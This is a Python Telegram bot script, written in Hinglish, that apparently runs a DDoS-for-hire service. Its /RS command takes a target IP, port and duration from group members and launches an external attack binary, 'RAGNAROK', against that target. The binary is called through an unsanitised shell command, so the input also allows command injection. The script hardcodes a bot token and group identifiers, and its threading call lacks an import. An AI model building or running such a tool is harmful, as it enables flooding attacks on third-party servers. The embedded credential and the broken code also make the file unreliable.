#!/usr/bin/python3
import telebot
import datetime
import time
import subprocess
from telebot import types

# TELEGRAM BOT TOKEN
bot = telebot.TeleBot('8048715452:AAHDXOo6-QlDxMyApE2pjgrp8khE_5yvIg8')

# GROUP AND CHANNEL DETAILS
GROUP_ID = "-1002369239894"
CHANNEL_USERNAME = "@KHAPITAR_BALAK77"
SCREENSHOT_CHANNEL = "@KHAPITAR_BALAK77"  # SCREENSHOT VERIFICATION CHANNEL
ADMINS = [7129010361]  # ADMIN IDs

# GLOBAL VARIABLES
is_attack_running = False
attack_end_time = None
pending_feedback = {}
warn_count = {}

# FUNCTION TO CHECK IF USER IS IN CHANNEL
def is_user_in_channel(user_id):
    try:
        member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False

# SCREENSHOT VERIFICATION FUNCTION
def verify_screenshot(user_id, message):
    if user_id in pending_feedback:
        bot.forward_message(SCREENSHOT_CHANNEL, message.chat.id, message.message_id)
        bot.send_message(SCREENSHOT_CHANNEL, f"📸 **USER `{user_id}` KA SCREENSHOT VERIFIED!** ✅")
        bot.reply_to(message, "✅ SCREENSHOT MIL GAYA! AB TU NAYA ATTACK LAGA SAKTA HAI. 🚀")
        del pending_feedback[user_id]  
    else:
        bot.reply_to(message, "❌ AB SCREENSHOT BHEJNE KI ZAROORAT NAHI HAI!")

# HANDLE ATTACK COMMAND
@bot.message_handler(commands=['RS'])
def handle_attack(message):
    global is_attack_running, attack_end_time
    user_id = message.from_user.id
    command = message.text.split()

    if message.chat.id != int(GROUP_ID):
        bot.reply_to(message, "🚫 YE BOT SIRF GROUP ME CHALEGA! ❌")
        return

    if not is_user_in_channel(user_id):
        bot.reply_to(message, f"❗ PEHLE CHANNEL JOIN KAR! {CHANNEL_USERNAME}")
        return

    if pending_feedback.get(user_id, False):
        bot.reply_to(message, "PEHLE SCREENSHOT BHEJ, WARNA NAYA ATTACK NAHI MILEGA! 😡")
        return

    if is_attack_running:
        bot.reply_to(message, "⚠️ EK ATTACK ALREADY CHAL RAHA HAI! CHECK KAR SAKTE HO /check !")
        return

    if len(command) != 4:
        bot.reply_to(message, "⚠️ USAGE: /RS <IP> <PORT> <TIME>")
        return

    target, port, time_duration = command[1], command[2], command[3]

    try:
        port = int(port)
        time_duration = int(time_duration)
    except ValueError:
        bot.reply_to(message, "❌ PORT AUR TIME NUMBER HONE CHAHIYE!")
        return

    if time_duration > 180:
        bot.reply_to(message, "🚫 180S SE ZYADA ALLOWED NAHI HAI!")
        return

    confirm_msg = f"🔥 ATTACK DETAILS:\n🎯 TARGET: `{target}`\n🔢 PORT: `{port}`\n⏳ DURATION: `{time_duration}S`\nSTATUS: `CHAL RAHA HAI...`\n📸 ATTACK KE BAAD SCREENSHOT BHEJNA ZAROORI HAI!"

    bot.send_message(message.chat.id, confirm_msg, parse_mode="Markdown")

    is_attack_running = True
    attack_end_time = datetime.datetime.now() + datetime.timedelta(seconds=time_duration)
    pending_feedback[user_id] = True  

    bot.send_message(message.chat.id, f"🚀 ATTACK SHURU!\n🎯 `{target}:{port}`\n⏳ {time_duration}S\nBETA SCREENSHOT BHEJ AB", parse_mode="Markdown")

    try:
        subprocess.run(f"./RAGNAROK {target} {port} {time_duration} CRACKS", shell=True, check=True, timeout=time_duration)
    except subprocess.TimeoutExpired:
        bot.reply_to(message, "❌ ATTACK TIMEOUT HO GAYA! 🚨")
    except subprocess.CalledProcessError:
        bot.reply_to(message, "❌ ATTACK FAIL HO GAYA!")
    finally:
        is_attack_running = False
        attack_end_time = None  

    bot.send_message(message.chat.id, "✅ ATTACK KHATAM! 🎯\n📸 AB SCREENSHOT BHEJ, WARNA AGLA ATTACK NAHI MILEGA!")

# AUTO ANNOUNCEMENT SYSTEM
def auto_announcement():
    while True:
        time.sleep(21600)  # 6 HOURS
        bot.send_message(GROUP_ID, "📢 **GRP UPDATE:** RULES FOLLOW KARO, WARNA BAN PAKKA! 🚀")

# HANDLE SCREENSHOT SUBMISSION
@bot.message_handler(content_types=['photo'])
def handle_screenshot(message):
    user_id = message.from_user.id
    verify_screenshot(user_id, message)

# ADMIN RESTART COMMAND (ONLY ADMINS)
@bot.message_handler(commands=['restart'])
def restart_bot(message):
    if message.from_user.id in ADMINS:
        bot.send_message(message.chat.id, "♻️ BOT RESTART HO RAHA HAI...")
        time.sleep(2)
        subprocess.run("python3 m.py", shell=True)
    else:
        bot.reply_to(message, "🚫 SIRF ADMIN HI RESTART KAR SAKTA HAI!")

# HANDLE CHECK COMMAND
@bot.message_handler(commands=['check'])
def check_status(message):
    if is_attack_running:
        remaining_time = (attack_end_time - datetime.datetime.now()).total_seconds()
        bot.reply_to(message, f"✅ **ATTACK CHAL RAHA HAI!**\n⏳ **BACHI HUI TIME:** {int(remaining_time)}S")
    else:
        bot.reply_to(message, "❌ KOI ATTACK ACTIVE NAHI HAI!")

# HANDLE WARN SYSTEM
@bot.message_handler(commands=['warn'])
def warn_user(message):
    if message.from_user.id not in ADMINS:
        return

    if not message.reply_to_message:
        bot.reply_to(message, "❌ KISI KO WARN KARNE KE LIYE USKE MESSAGE PE REPLY KARO!")
        return

    user_id = message.reply_to_message.from_user.id
    warn_count[user_id] = warn_count.get(user_id, 0) + 1

    if warn_count[user_id] >= 3:
        bot.kick_chat_member(GROUP_ID, user_id)
        bot.send_message(GROUP_ID, f"🚫 **USER {user_id} KO 3 WARN MIL CHUKE THE, ISLIYE BAN KAR DIYA GAYA!**")
    else:
        bot.send_message(GROUP_ID, f"⚠️ **USER {user_id} KO WARNING {warn_count[user_id]}/3 DI GAYI HAI!**")

# START POLLING
threading.Thread(target=auto_announcement).start()
bot.polling(none_stop=True)